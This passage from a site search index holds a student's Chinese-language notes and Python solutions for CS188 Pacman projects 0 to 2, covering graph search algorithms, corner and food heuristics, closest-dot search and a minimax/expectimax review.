<li>WSL ubuntu 22.04\uff1b</li> <li>miniconda =&gt; python=3.9.19</li> </ul> </li> <li>project 4-<ul> <li>MacOS</li> <li>miniforge3 =&gt; Python=3.10.16</li> </ul> </li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-0/","title":"Tutorial","text":"<p>Prerequisite</p> <ul> <li>project 0\uff08\u82e5\u9700\u8981\u8ba4\u8bc1\uff0c\u53ef\u89c1\u4ed3\u5e93\uff09</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-0/#explain","title":"explain","text":"<p>\u8fd9\u4e2a\u662f\u8ba9\u6211\u4eec\u719f\u6089\u9879\u76ee\u4f7f\u7528\u548c python \u7684\u8003\u5bdf\uff0c\u6ca1\u5565\u597d\u8bb2\u7684\u3002</p> <pre><code>python autograder.py # \u8bc4\u5206\u5168\u90e8\npython autograder.py -q q1 # \u6d4b\u8bd5\u7b2c\u4e00\u95ee\n</code></pre> addition.py<pre><code>def add(a, b):\n    \"Return the sum of a and b\"\n    \"*** YOUR CODE HERE ***\"\n    return a + b\n</code></pre> buyLotsOfFruit.py<pre><code>def buyLotsOfFruit(orderList):\n    \"\"\"\n        orderList: List of (fruit, numPounds) tuples\n\n    Returns cost of order\n    \"\"\"\n    totalCost = 0.0\n    \"*** YOUR CODE HERE ***\"\n    # \u5bf9\u4e8e\u8fd9\u9053\u7b80\u5355\u7684\u9898\uff0c\u4e0b\u9762\u7684\u6761\u4ef6\u8bed\u53e5\u5012\u662f\u53ef\u4ee5\u7701\u7565\n    for fruit, numPounds in orderList:\n        if fruit in fruitPrices:\n            totalCost += fruitPrices[fruit] * numPounds\n        else:\n            print(\"Sorry we don't have %s\" % fruit)\n            return None\n    return totalCost\n</code></pre> shopSmart.py<pre><code>def shopSmart(orderList, fruitShops):\n    \"\"\"\n    orderList: List of (fruit, numPound) tuples\n    fruitShops: List of FruitShops\n    \"\"\"\n    \"*** YOUR CODE HERE ***\"\n    best_shop = None\n    # \u5c06 lowest_cost \u521d\u59cb\u5316\u4e3a\u6b63\u65e0\u7a77\u5927\uff0c\u8fd9\u6837\u7b2c\u4e00\u6b21\u5faa\u73af\u65f6\uff0clowest_cost \u4f1a\u88ab\u66f4\u65b0\u4e3a\u7b2c\u4e00\u4e2a\u5546\u5e97\u7684 cost\n    lowest_cost = float(\"inf\")\n    for fruitShop in fruitShops:\n        cost = 0\n        for fruit, numPounds in orderList:\n            cost += fruitShop.fruitPrices[fruit] * numPounds\n        if cost &lt; lowest_cost:\n            lowest_cost = cost\n            best_shop = fruitShop\n    return best_shop\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-0/#pass","title":"pass","text":"<ul> <li>project-0 \u5168\u90e8\u901a\u8fc7</li> <li>\u5168\u4ee3\u7801</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-1/","title":"Search","text":"<p>Prerequisite</p> <ul> <li>02-State_Spaces_Uninformed_Search</li> <li>03-Informed_Search_Astar_and_Heuristics</li> <li>preject 1 \uff08\u82e5\u9700\u8981\u8ba4\u8bc1\uff0c\u53ef\u89c1\u4ed3\u5e93\uff09</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-1/#explain","title":"explain","text":"<p>\u524d\u9762\u6709\u5f88\u591a\u63a2\u7d22\uff0c\u5e0c\u671b\u770b\u6b63\u786e\u89e3\u7b54\u53ef\u76f4\u63a5\u770b \"right\"\uff1b\u6700\u7ec8\u7ed3\u679c\u89c1 \"pass\" \u3002</p> <p>pacman.py \u7684\u53c2\u6570\u5bf9\u4e8e\u5bf9\u4e8e\u5e2e\u52a9\u6211\u4eec\u8fdb\u884c\u6d4b\u8bd5\u5f88\u6709\u7528\uff1a</p> man pacman<pre><code>$ python pacman.py -h\n\nUsage: \n    USAGE:      python pacman.py &lt;options&gt;\n    EXAMPLES:   (1) python pacman.py\n                    - starts an interactive game\n                (2) python pacman.py --layout smallClassic --zoom 2\n                OR  python pacman.py -l smallClassic -z 2\n                    - starts an interactive game on a smaller board, zoomed in\n\n\nOptions:\n  -h, --help            show this help message and exit\n  -n GAMES, --numGames=GAMES\n                        the number of GAMES to play [Default: 1]\n  -l LAYOUT_FILE, --layout=LAYOUT_FILE\n                        the LAYOUT_FILE from which to load the map layout\n                        [Default: mediumClassic]\n  -p TYPE, --pacman=TYPE\n                        the agent TYPE in the pacmanAgents module to use\n                        [Default: KeyboardAgent]\n  -t, --textGraphics    Display output as text only\n  -q, --quietTextGraphics\n                        Generate minimal output and no graphics\n  -g TYPE, --ghosts=TYPE\n                        the ghost agent TYPE in the ghostAgents module to use\n                        [Default: RandomGhost]\n  -k NUMGHOSTS, --numghosts=NUMGHOSTS\n                        The maximum number of ghosts to use [Default: 4]\n  -z ZOOM, --zoom=ZOOM  Zoom the size of the graphics window [Default: 1.0]\n  -f, --fixRandomSeed   Fixes the random seed to always play the same game\n  -r, --recordActions   Writes game histories to a file (named by the time\n                        they were played)\n  --replay=GAMETOREPLAY\n                        A recorded game file (pickle) to replay\n  -a AGENTARGS, --agentArgs=AGENTARGS\n                        Comma separated values sent to agent. e.g.\n                        \"opt1=val1,opt2,opt3=val3\"\n  -x NUMTRAINING, --numTraining=NUMTRAINING\n                        How many episodes are training (suppresses output)\n                        [Default: 0]\n  --frameTime=FRAMETIME\n                        Time to delay between frames; &lt;0 means keyboard\n                        [Default: 0.1]\n  -c, --catchExceptions\n                        Turns on exception handling and timeouts during games\n  --timeout=TIMEOUT     Maximum length of time an agent can spend computing in\n                        a single game [Default: 30]\n</code></pre> <p>\u82e5\u52a0\u5165\u4e0b\u5217\u8bed\u53e5\uff0c\u6d4b\u8bd5\u8fd0\u884c\uff1a</p> <pre><code>print(\"Start:\", problem.getStartState())\nprint(\"Is the start a goal?\", problem.isGoalState(problem.getStartState()))\nprint(\"Start's successors:\", problem.getSuccessors(problem.getStartState()))\n\n# Start: (5, 5)\n# Is the start a goal? False\n# Start's successors: [((5, 4), 'South', 1), ((4, 5), 'West', 1)]\n</code></pre> <p>\u7aa5\u89c1\u4e86 problem/state \u7684\u7ed3\u6784\uff0c\u5176\u4e2d successors \u662f\u4e24\u4e2a successor\uff0c\u5176\u5185\u5bb9\u4f9d\u6b21\u4ee3\u8868\uff1a(state\uff0caction\uff0ccost) =&gt; \uff08\u5750\u6807\uff0c\u65b9\u5411\uff0c\u6b65\u957f\uff09\u3002</p> <p>\u968f\u4fbf\u8865\u5168 dfs \u89c2\u5bdf\u5730\u56fe\uff1a</p> dfs test<pre><code>def depthFirstSearch(problem: SearchProblem):\n    return []\n    util.raiseNotDefined()\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa\u6765\uff0c\u201c\u5750\u6807\u539f\u70b9\u201d\u5728\u5de6\u4e0b\u89d2\uff0c\u662f\u7ecf\u5178\u7684\u201c2D\u51fd\u6570\u5750\u6807\u201d\u800c\u975e\u201c\u77e9\u9635\u5750\u6807\u201d\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-1/#q1-q4","title":"Q1 - Q4","text":"","tags":["notes","cs188"]},{"location":"note/cs188/project/project-1/#explore","title":"explore","text":"<p>\u6839\u636e\u4ee5\u524d\u6240\u5b66\uff0cdfs\u5c1d\u8bd5 Q1\uff1a</p> dfs<pre><code>def depthFirstSearch(problem: SearchProblem):\n    reached = set()  # \u8bb0\u5f55\u5df2\u7ecf\u8bbf\u95ee\u8fc7\u7684\u8282\u70b9\n    _stack = util.Stack()  # \u7528\u6808\u6765\u5b9e\u73b0DFS\n    _stack.push(\n        (problem.getStartState(), [])\n    )  # \u5c06\u521d\u59cb\u72b6\u6001\uff08\u5750\u6807\uff0c\u5230\u8fbe\u8be5\u5750\u6807\u9700\u8981\u7684\u65b9\u5411\u7ec4\uff09\u538b\u5165\u6808\u4e2d\n    while not _stack.isEmpty():\n        state, actions = _stack.pop()\n        if problem.isGoalState(state):\n            return actions\n        if state not in reached:\n            reached.add(state)\n            for successor, action, _ in problem.getSuccessors(state):\n                new_path = actions + [action]\n                _stack.push((successor, new_path))\n    return actions\n    util.raiseNotDefined()\n</code></pre> <p>\u987a\u5229\u901a\u8fc7 Q1\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-1/#right","title":"right","text":"<p>\u4e0b\u4e00\u4e2a\uff1fNO! \u5728 note02 \u4e2d\u6211\u4eec\u77e5\u9053\u4e09\u4e2a\u641c\u7d22\u7b97\u6cd5\u603b\u4f53\u5dee\u4e0d\u591a\uff0c\u4e14\u8fd9\u91cc\u90fd\u662f graph search:</p> <p>Now it\u2019s time to write full-fledged generic search functions to help Pacman plan routes! Pseudocode for the search algorithms you\u2019ll write can be found in the lecture slides.</p> pseudocode for graph search in note03<pre><code>function GRAPH-SEARCH(problem, frontier) return a solution or failure\n    reached \u2190 an empty set\n    frontier \u2190 INSERT(MAKE-NODE(INITIAL-STATE[problem]), frontier)\n    while not IS-EMPTY(frontier) do\n        node \u2190 POP(frontier)\n        if problem.IS-GOAL(node.STATE) then\n            return node\n        end\n        if node.STATE is not in reached then\n            add node.STATE in reached\n            for each child-node in EXPAND(problem, node) do\n                frontier \u2190 INSERT(child-node, frontier)\n            end\n        end\n    end\n    return failure\n</code></pre> <p>\u6240\u4ee5\u6211\u4eec\u7167\u732b\u753b\u864e\uff0c\u7ed9\u51fa\uff1a</p> graphSearch<pre><code>def graphSearch(problem, frontier):\n    \"\"\"\n    Implements the graph search algorithm using the provided frontier data structure.\n    \"\"\"\n    reached = set()\n    frontier.push((problem.getStartState(), []))  # take (state, actions) as node\n\n    while not frontier.isEmpty():\n        state, actions = frontier.pop()\n\n        if problem.isGoalState(state):\n            return actions\n\n        if state not in reached:\n            reached.add(state)\n            for successor, action, _ in problem.getSuccessors(state):\n                new_path = actions + [action]\n                frontier.push((successor, new_path))\n\n    return None  # No solution found\n</code></pre> <p>\u663e\u7136\uff0c\u8fd9\u91cc\u7684 frontier \u5728 DFS \u4e2d\u5c31\u662f Stack\uff0c\u5728 BFS \u4e2d\u5c31\u662f Queue\uff1b\u5728 UCS/ \\(A^*S\\)  \u4e2d\u662f PriorityQueue\u3002</p> <p>\u524d\u4e24\u4e2a\u597d\u8bf4\uff1bPrigirityQueue \u7684 push \u4e0e\u524d\u4e8c\u8005\u53c2\u6570\u5c31\u4e0d\u540c\uff0c\u81ea\u7136\u662f\u62a5\u9519\u4e86\uff1b\u4f46\u662f\u6ce8\u610f\u5230 util.py \u4e2d\u7684\uff1a</p> PriorityQueueWithFunction<pre><code>class PriorityQueueWithFunction(PriorityQueue): # success PriorityQueue\n    \"\"\"\n    Implements a priority queue with the same push/pop signature of the\n    Queue and the Stack classes. This is designed for drop-in replacement for\n    those two classes. The caller has to provide a priority function, which\n    extracts each item's priority.\n    \"\"\"\n    def  __init__(self, priorityFunction):\n        \"priorityFunction (item) -&gt; priority\"\n        self.priorityFunction = priorityFunction      # store the priority function\n        PriorityQueue.__init__(self)        # super-class initializer\n\n    def push(self, item):\n        \"Adds an item to the queue with priority from the priority function\"\n        PriorityQueue.push(self, item, self.priorityFunction(item))\n</code></pre> <p>\u6839\u636e\u6ce8\u91ca\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u6765\u8fd9\u5c31\u662f\u5bf9 PriorityQueue \u7684\u5c01\u88c5\u4e86\uff0c\u552f\u4e00\u4e0d\u540c\u7684\u662f\u6211\u4eec\u9700\u8981\u4f7f\u7528\u4e00\u4e2a priorityFunction(item) \u6765\u5b9e\u4f8b\u5316\u5b83\uff08\u6309\u7167 Stack \u7c7b\u4e2d\u7684\u4f7f\u7528\uff0citem \u5e94\u8be5\u6307\u6211\u4eec\u8bbe\u5b9a\u7684\u5143\u7ec4 node\uff09\uff1b\u518d\u770b\uff1a</p> getCostOfActions<pre><code>class SearchProblem:\n    ...\n    def getCostOfActions(self, actions):\n        \"\"\"\n         actions: A list of actions to take\n\n        This method returns the total cost of a particular sequence of actions.\n        The sequence must be composed of legal moves.\n        \"\"\"\n        util.raiseNotDefined()\n</code></pre> <p>\u7528\u8fd9\u4e2a\u65b9\u6cd5\u83b7\u53d6 cost\uff0c\u4f5c\u4e3a UCS minheap \u7684\u4f9d\u636e\uff1b\u800c \\(A^*S\\) \u591a\u52a0\u4e86\u4e00\u4e2a heuristic value \u5373\u53ef\uff1b\u4f60\u8bf4\u5de7\u4e0d\u5de7\uff0caStarSearch \u7684\u53c2\u6570\u5c31\u6709\u8fd9\u4e48\u4e00\u4e2a\u51fd\u6570\uff0cQ1 - Q4 \u901a\u8fc7 \u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-1/#q5-3-pts-finding-all-the-corners-lecture-3","title":"Q5 (3 pts): Finding All the Corners (Lecture 3)","text":"<p>\u5b8c\u6210\u8fd9\u9898\u4f7f\u7528\u4e86 bfs\uff0c\u6240\u4ee5\u9700\u8981\u5148\u8fd0\u884c <code>$ python pacman.py -l tinyCorners -p SearchAgent -a fn=bfs</code> \u786e\u4fdd\u901a\u8fc7\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-1/#explore_1","title":"explore","text":"<p>\u8fd9\u5173\u5b9e\u73b0\u4e00\u4e2a CornersProblem \u7c7b\uff1b\u9996\u5148\u6211\u4eec\u770b <code>class CornersProblem(search.SearchProblem):</code> \u5176\u7ee7\u627f\u4e86\u6211\u4eec\u4e4b\u524d search.py \u4e2d\u7684 SearchProblem \u5b9a\u597d\u7684\u6a21\u677f\uff0c\u6240\u4ee5\u6211\u4eec\u5e94\u5f53\u53c2\u8003 Q1-Q4 \u6240\u671f\u671b\u7684\u529f\u80fd\u6765\u5b9e\u73b0\u5b83\uff1b\u53c8\u5728\u8be5\u6587\u4ef6\u4e2d\u641c <code>search.SearchProblem</code> \uff0c\u627e\u5230\u4e86 <code>class PositionSearchProblem(search.SearchProblem):</code> \u8fd9\u4e2a\u5144\u5f1f\uff0c\u8fd8\u662f\u5b9e\u73b0\u597d\u7684\uff1b\u90a3\u4e48\u6211\u4eec\u7ee7\u7eed\u7167\u732b\u753b\u864e\uff1a</p> Corners Problem<pre><code>def getStartState(self):\n    return self.startingPosition\n    util.raiseNotDefined()\n\ndef isGoalState(self, state: Any):\n    # \u6682\u65f6\u4e0d\u4f1a\uff0c\u8ba9\u5176\u59cb\u7ec8\u8fd4\u56deFalse\n    util.raiseNotDefined()\n\ndef getSuccessors(self, state: Any):\n    successors = []\n    for action in [\n        Directions.NORTH,\n        Directions.SOUTH,\n        Directions.EAST,\n        Directions.WEST,\n    ]:\n        x, y = state\n        dx, dy = Actions.directionToVector(action)\n        nextx, nexty = int(x + dx), int(y + dy)\n        if not self.walls[nextx][nexty]:\n            nextState = (nextx, nexty)\n            # cost = self.costFn(nextState)\n            cost = 1\n            successors.append((nextState, action, cost))\n    self._expanded += 1  # DO NOT CHANGE\n    return successors\n</code></pre> <p>\u6211\u4eec\u8ba9 IsGoalState \u59cb\u7ec8\u8fd4\u56de False\uff0c\u90a3\u4e48 pacman \u59cb\u7ec8\u6ca1\u6709\u4e00\u6761\u8def\u5f84\u53ef\u4ee5\u8d70\uff0c\u5fc5\u7136\u9759\u6b62\u4e0d\u52a8\uff1b\u8fd0\u884c <code>$ python pacman.py -l tinyCorners -p SearchAgent -a fn=bfs,prob=CornersProblem</code> \u770b\u770b\u3002</p> <p>\u90a3\u4e48\u6211\u4eec\u8be5\u600e\u4e48\u5199 IsGoalState \u5462\uff1f</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-1/#right_1","title":"right","text":"<p>\u4e0b\u9762\u5185\u5bb9\u53c2\u8003 szzxljr \u7684\u4ee3\u7801\uff0c\u5176\u5b9e\u4e5f\u4f53\u73b0\u5728\u540e\u9762\u7684 FoodSearchProblem \u4e2d\u3002</p> <p>\u6211\u4eec\u5047\u60f3\u6211\u4eec\u4e0a\u8ff0\u7684 node \u4e0d\u4ec5\u5e26\u7740\u4f4d\u7f6e\u4fe1\u606f\u548c\u52a8\u4f5c\uff0c\u8fd8\u5e26\u7740\u4e00\u4e2a corners\uff1b\u6bcf\u7ecf\u8fc7\u4e00\u4e2a\u5bf9\u5e94\u7684 corner\uff0c\u6211\u4eec\u5c31\u4e22\u6389\u8fd9\u4e2a corner\uff1b\u5f53\u6211\u4eec\u4e22\u5b8c\u65f6\uff0c\u5c31\u8fbe\u5230\u76ee\u6807\u4e86\uff1b\u4f46\u662f\u76f4\u63a5(state, actions, corners) \u662f\u4e0d\u884c\u7684<sup>1</sup>\u3002\u6240\u4ee5\u6211\u4eec\u5c06\u5176\u548c\u539f state \u4f5c\u4e3a\u65b0\u5143\u7ec4\uff0c\u5373 state &lt;= (state, corners):</p> right Corners Problem<pre><code>def getStartState(self):\n    return (self.startingPosition, self.corners)\n    util.raiseNotDefined()\n\ndef isGoalState(self, state: Any):\n    return len(state[1]) == 0\n    util.raiseNotDefined()\n\ndef getSuccessors(self, state: Any):\n    successors = []\n    for action in [\n        Directions.NORTH,\n        Directions.SOUTH,\n        Directions.EAST,\n        Directions.WEST,\n    ]:\n        x, y = state[0]\n        corners = state[1]\n        dx, dy = Actions.directionToVector(action)\n        nextx, nexty = int(x + dx), int(y + dy)\n        if not self.walls[nextx][nexty]:\n            nextState0 = (nextx, nexty)\n            corners = tuple(filter(lambda c: c != nextState0, corners))\n            # cost = self.costFn(nextState0) # accoding to the hint, cost is 1\n            cost = 1\n            successors.append(((nextState0, corners), action, cost))\n    # print(successors)\n    self._expanded += 1  # DO NOT CHANGE\n    return successors\n</code></pre> <p>Q5\u901a\u8fc7</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-1/#q6-7","title":"Q6-7","text":"","tags":["notes","cs188"]},{"location":"note/cs188/project/project-1/#explore_2","title":"explore","text":"<p>Q6 \u5176\u5b9e\u5c31\u662f\u8ba9\u6211\u4eec\u60f3\u4e00\u4e2a\u6bd4\u8f83\u597d\u7684 <code>def cornersHeuristic(state: Any, problem: CornersProblem):</code> \u51fd\u6570\uff1b\u5728\u6570\u5b66\u4e2d\u63cf\u8ff0\u201c\u8ddd\u79bb\u201d\u7684\u8303\u6570\u5c31\u6bd4\u8f83\u9002\u5408\u5148\u8bd5\u8bd5\u624b\uff1b\u66fc\u54c8\u987f\u8ddd\u79bb\u4e5f\u662f\u5176\u4e2d\u4e00\u79cd\uff0c\u4e14 SearchAgent.py \u4e2d\u6709\u5b9e\u73b0\uff1a</p> manhattanHeuristic<pre><code>def manhattanHeuristic(position, problem, info={}):\n    \"The Manhattan distance heuristic for a PositionSearchProblem\"\n    xy1 = position\n    xy2 = problem.goal\n    return abs(xy1[0] - xy2[0]) + abs(xy1[1] - xy2[1])\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u6b64\u65f6\u76f8\u6bd4\u4e8e\u5269\u4e0b\u7684 corner \u7684\u66fc\u54c8\u987f\u8ddd\u79bb\uff0c\u5e76\u53d6\u6700\u5c0f\u8005\u5373\u53ef\uff1a</p> cornerHeuristic using min manhattanDistance<pre><code>def manhattanDistance(m, n):\n    return abs(m[0] - n[0]) + abs(m[1] - n[1])\n\ndef cornersHeuristic(state: Any, problem: CornersProblem):\n    corners = problem.corners  # These are the corner coordinates\n    walls = problem.walls  # These are the walls of the maze, as a Grid (game.py)\n    if len(state[1]) == 0:\n        return 0\n    min_distance = float(\"inf\")\n    for corner in state[1]:\n        tmp = manhattanDistance(corner, state[0])\n        min_distance = min(min_distance, tmp)\n    return min_distance\n</code></pre> <p>Q6\u534a\u901a\u8fc7</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-1/#right_2","title":"right","text":"<p>\u4f46\u662f\u60f3\u60f3\uff0cmanhattenDistance \u672c\u8eab\u5c31\u4e00\u5b9a\u4e0d\u6bd4\u5b9e\u9645\u9700\u8981\u7684\u6b65\u6570\u591a\uff0c\u5e94\u5f53\u53d6\u6700\u5927\u503c\u6765\u8d34\u8fd1\uff1b\u540c\u65f6\u53d1\u73b0 util.py \u4e2d\u5b9e\u73b0\u4e86\u66fc\u54c8\u987f\u8ddd\u79bb\uff1a</p> cornerHeuristic using max manhattanDistance<pre><code>def cornersHeuristic(state: Any, problem: CornersProblem):\n    if len(state[1]) == 0:\n        return 0\n    max_distance = 0\n    for corner in state[1]:\n        # tmp = manhattanDistance(corner, state[0])\n        tmp = util.manhattanDistance(corner, state[0])\n        max_distance = max(max_distance, tmp)\n    return max_distance\n</code></pre> <p>Q6\u901a\u8fc7</p> <p>Q7 \u4e5f\u662f\u540c\u7406\uff0c\u4e4b\u524d\u662f 4 \u4e2a\u8c46\u5b50\u5728\u56db\u4e2a\u89d2\u843d\uff0c\u73b0\u5728\u662f\u82e5\u5e72\u4e2a\u8c46\u5b50\u5728\u67d0\u67d0\u4e2a\u4f4d\u7f6e\uff1b\u6240\u4ee5\u601d\u8def\u57fa\u672c\u4e00\u81f4\uff08\u5176\u4e2d\u7684 mazeDistance \u662f\u540e\u6765\u770b\u4e86\u5176\u4ed6\u4eba\u7684\u9898\u89e3\u53d1\u73b0\u7684\uff09\uff1a</p> <pre><code>def foodHeuristic(state: Tuple[Tuple, List[List]], problem: FoodSearchProblem):\n    position, foodGrid = state\n    distances = [0]\n    for food in foodGrid.asList():\n        distances.append(mazeDistance(position, food, problem.startingGameState))\n    return max(distances)\n</code></pre> <p>Q7\u901a\u8fc7</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-1/#q8-3-pts-suboptimal-search","title":"Q8 (3 pts): Suboptimal Search","text":"","tags":["notes","cs188"]},{"location":"note/cs188/project/project-1/#right_3","title":"right","text":"<p>\u6839\u636e\u63d0\u793a\uff0c\u6211\u4eec\u5148\u8865\u5168 AnyFoodSearchProblem\uff1a</p> AnyFoodSearchProblem<pre><code>class AnyFoodSearchProblem(PositionSearchProblem):\n    ...\n    def isGoalState(self, state: Tuple[int, int]):\n    x, y = state\n    return self.food[x][y] # \u53bb\u770b\u8fd9\u4e2a\u6210\u5458\u7684\u5b9a\u4e49\u5c31\u61c2\u4e86\n    util.raiseNotDefined()\n</code></pre> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u4e2a\u7c7b\u5728\u6b64\u5b9e\u73b0\u7684\u529f\u80fd\u5c31\u662f\u68c0\u67e5\u67d0\u4e2a\u4f4d\u7f6e\u98df\u7269\u662f\u5426\u88ab\u5403\u4e86\u3002</p> <p>Q8 \u672c\u8eab\u66f4\u7b80\u5355\u4e86\uff0c<code>Returns a path (a list of actions) to the closest dot, starting from gameState</code> \uff0c\u5728\u6bcf\u4e00\u6b65\u6210\u672c\u90fd\u4e3a 1 \u7684\u60c5\u51b5\u4e0b\uff0c\u6700\u8fd1\u65e2\u662f\u6210\u672c\u6700\u5c0f\uff0cuniformCostSearch \u5373\u53ef\uff1a</p> findPathToClosestDot<pre><code>def findPathToClosestDot(self, gameState: pacman.GameState):\n    \"\"\"\n    Returns a path (a list of actions) to the closest dot, starting from\n    gameState.\n    \"\"\"\n    # Here are some useful elements of the startState\n    startPosition = gameState.getPacmanPosition()\n    food = gameState.getFood()\n    walls = gameState.getWalls()\n    problem = AnyFoodSearchProblem(gameState)\n\n    \"*** YOUR CODE HERE ***\"\n    return search.uniformCostSearch(problem)\n    util.raiseNotDefined()\n</code></pre> <p>Q8 \u901a\u8fc7</p>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-1/#pass","title":"pass","text":"<ul> <li>project-1 \u5168\u90e8\u901a\u8fc7</li> <li>\u5168\u4ee3\u7801</li> </ul> <p>Summary</p> <p>\u591a\u770b\u76f8\u5173\u6ce8\u91ca\u548c\u5df2\u6709\u7684\u7c7b\u4f3c\u5b9e\u73b0\uff1b\u5f00\u59cb\u524d\u6e05\u695a\u81ea\u5df1\u80fd\u7528\u54ea\u4e9b\u4e1c\u897f\u3002</p> <ol> <li> <p>\u6211\u4eec\u9700\u8981\u548c\u4e4b\u524d\u5b9e\u73b0\u7684 BFS \u63a5\u53e3\uff0c\u8fd9\u4e2a node \u5e94\u8be5\u53ea\u6709\u4e24\u4e2a\u6210\u5458\u3002\u00a0\u21a9</p> </li> </ol>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-2/","title":"MultiAgent","text":"<p>Prerequisite</p> <ul> <li>05-Trees_Minimax_Pruning</li> <li>06-Expectimax_Monte_Carlo_Tree_Search</li> <li>preject 2 \uff08\u82e5\u9700\u8981\u8ba4\u8bc1\uff0c\u53ef\u89c1\u4ed3\u5e93\uff09</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-2/#quick-review","title":"Quick Review","text":"<ul> <li>\u535a\u5f08\u6811\uff08Game Tree\uff09<ul> <li>\u535a\u5f08\u6811\u662f\u4e00\u79cd\u56fe\u5f62\u7ed3\u6784\uff0c\u7528\u4e8e\u8868\u793a\u535a\u5f08\u4e2d\u7684\u6240\u6709\u53ef\u80fd\u72b6\u6001\u53ca\u5176\u76f8\u5e94\u7684\u51b3\u7b56\u3002\u6811\u7684\u8282\u70b9\u4ee3\u8868\u6e38\u620f\u72b6\u6001\uff0c\u8fb9\u4ee3\u8868\u73a9\u5bb6\u7684\u884c\u52a8\u3002\u901a\u8fc7\u5206\u6790\u535a\u5f08\u6811\uff0c\u73a9\u5bb6\u53ef\u4ee5\u8bc4\u4f30\u4e0d\u540c\u7b56\u7565\u7684\u7ed3\u679c\uff0c\u4ece\u800c\u9009\u62e9\u6700\u4f73\u884c\u52a8\u3002</li> </ul> </li> <li>Minimax\uff08\u6781\u5c0f\u6781\u5927\u7b97\u6cd5\uff09<ul> <li>\u4e00\u79cd\u51b3\u7b56\u7b97\u6cd5\uff0c\u7528\u4e8e\u5728\u96f6\u548c\u6e38\u620f\u4e2d\u5bfb\u627e\u6700\u4f73\u7b56\u7565\uff0c\u901a\u8fc7\u5047\u8bbe\u5bf9\u624b\u4e5f\u4f1a\u91c7\u53d6\u6700\u4f73\u884c\u52a8\uff0c\u4ece\u800c\u6700\u5c0f\u5316\u53ef\u80fd\u7684\u635f\u5931\u6216\u6700\u5927\u5316\u53ef\u80fd\u7684\u6536\u76ca\u3002</li> </ul> </li> <li>Alpha-Beta Pruning\uff08\u03b1-\u03b2 \u526a\u679d\uff09<ul> <li>\u4e00\u79cd\u4f18\u5316\u7b97\u6cd5\uff0c\u7528\u4e8e\u51cf\u5c11\u5728\u535a\u5f08\u6811\u4e2d\u8bc4\u4f30\u7684\u8282\u70b9\u6570\u91cf\uff0c\u4ece\u800c\u63d0\u9ad8 minimax \u7b97\u6cd5\u7684\u6548\u7387\uff0c\u5e38\u7528\u4e8e\u51b3\u7b56\u8fc7\u7a0b\u4e2d\u3002</li> </ul> </li> <li>Evaluation Functions\uff08\u8bc4\u4f30\u51fd\u6570\uff09<ul> <li>\u5728\u51b3\u7b56\u4e2d\u7528\u4e8e\u4f30\u8ba1\u7279\u5b9a\u5c40\u9762\u7684\u51fd\u6570\uff0c\u5e2e\u52a9 Agent \u5224\u65ad\u5f53\u524d\u72b6\u6001\u7684\u4f18\u52a3\uff0c\u4ee5\u4fbf\u505a\u51fa\u6700\u4f73\u51b3\u7b56\u3002</li> </ul> </li> <li>Expectimax\uff08\u671f\u671b\u6781\u5927\u7b97\u6cd5\uff09<ul> <li>\u4e00\u79cd\u6269\u5c55\u7684\u51b3\u7b56\u7b97\u6cd5\uff0c\u9002\u7528\u4e8e\u5305\u542b\u968f\u673a\u6027\u56e0\u7d20\u7684\u535a\u5f08\uff0c\u901a\u8fc7\u8ba1\u7b97\u6bcf\u4e2a\u53ef\u80fd\u7ed3\u679c\u7684\u671f\u671b\u503c\u6765\u9009\u62e9\u6700\u4f73\u884c\u52a8\uff0c\u5e38\u7528\u4e8e\u68cb\u7c7b\u6e38\u620f\u548c\u5176\u4ed6\u4e0d\u786e\u5b9a\u73af\u5883\u4e2d\u7684\u51b3\u7b56\u3002</li> </ul> </li> <li>Mixed Layer Types\uff08\u6df7\u5408\u5c42\u7c7b\u578b\uff09<ul> <li>\u5728\u51b3\u7b56\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u7684\u5bf9\u624b\u4e0d\u4e00\u5b9a\u53ea\u6709\u4e00\u4e2a\uff08\u4f46\u662f\u76ee\u7684\u76f8\u540c\uff09\uff0c\u4ed6\u4eec\u4f9d\u6b21\u884c\u52a8\uff0c\u6bcf\u4eba\u4f9d\u6b21\u5728\u535a\u5f08\u6811\u4e0a\u5360\u6709\u4e00\u5c42\u3002</li> </ul> </li> <li>General Game\uff08\u901a\u7528\u6e38\u620f\uff09<ul> <li>\u6211\u4eec\u7684\u591a\u4e2a\u5bf9\u624b\u7684\u76ee\u7684\u5e76\u975e\u76f8\u540c\uff0c\u5bf9\u624b\u7684\u6267\u884c\u987a\u5e8f\u5bf9\u7ed3\u679c\u5f71\u54cd\u5de8\u5927\u3002</li> </ul> </li> <li>Monte Carlo Tree Search\uff08\u8499\u7279\u5361\u6d1b\u6811\u641c\u7d22\uff09<ul> <li>\u8499\u7279\u5361\u6d1b\u6811\u641c\u7d22\u662f\u4e00\u79cd\u542f\u53d1\u5f0f\u641c\u7d22\u7b97\u6cd5\uff0c\u901a\u8fc7\u968f\u673a\u91c7\u6837\u548c\u6a21\u62df\u6765\u8bc4\u4f30\u6e38\u620f\u6811\u4e2d\u7684\u8282\u70b9\uff0c\u5e2e\u52a9\u505a\u51fa\u51b3\u7b56\u3002</li> </ul> </li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/project/project-2/#explain","title":"explain","text":"","tags":["notes","cs188"]},{"location":"note/cs188/project/project-2/#q1-4-pts-reflex-agent","title":"Q1 (4 pts): Reflex 